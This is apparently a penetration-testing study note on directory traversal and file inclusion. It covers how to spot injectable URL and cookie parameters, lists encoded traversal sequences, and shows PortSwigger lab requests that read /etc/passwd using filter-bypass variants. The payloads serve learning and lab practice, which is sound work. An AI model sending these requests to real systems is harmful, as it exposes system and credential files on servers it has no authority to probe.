# Authorization Testing
## Directory traversal File Include

### Techniques

1. Input Vector Enumeration 
* Are there request parameters which could be used for file-related operations?
* Are there unusual file extensions?
* Are there interesting variable names?
	+ **http://example.com/getUserProfile.jsp?item=ikki.html >>**
	  `item=ikki.html >> ikki >> inject`
	+ **http://example.com/index.php?file=content >>**
	  `file=content >> content >> inject`
	+ **http://example.com/main.cgi?home=index.htm >>**
	  `home=index.htm >> index >> inject`

* In Cookie
	+ Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower 
	`>> TEMPLATE=flower >> flower >> inject`

	+ Cookie: USER=1826cc8f:PSTYLE=GreenDotRed

		`>>PSTYLE=GreenDotRed >> GreenDotRed >> inject`


* Unix like OS: /
* Windows : `<drive letter>: , /`
* MAC OS : `<drive letter>: , :`
* URL encoding and double URL encoding :
```urlencode
%2e%2e%2f => ../ 
%2e%2e/ => ../
..%2f => ../
%2e%2e%5c => ..\
%2e%2e\ => ..\
..%5c => ..\
%252e%252e%255c => ..\
```
* Unicode/UTF-8 Encoding
```UTF
..%c0%af => ../
..%c1%9c => ..\
```
#### Practrice in PortSwigger Lab

 ```http
 GET /image?filename=../../../etc/passwd HTTP/1.1
 ```

 ![dir](./img/dir.png) 
 
 ```http
 GET /image?filename=....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1
 ```
![dir2](./img/dir2.png)

```http
GET /image?filename=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd HTTP/1.1
```
![dir3](./img/dir3.png)

```http
GET /image?filename=/var/www/images/../../../../../etc/passwd HTTP/1.1
```
![dir4](./img/dir4.png)

```http
GET /image?filename=/../../../../../../../../../../../etc/passwd.png HTTP/1.1
```
![dir5](./img/dir5.png)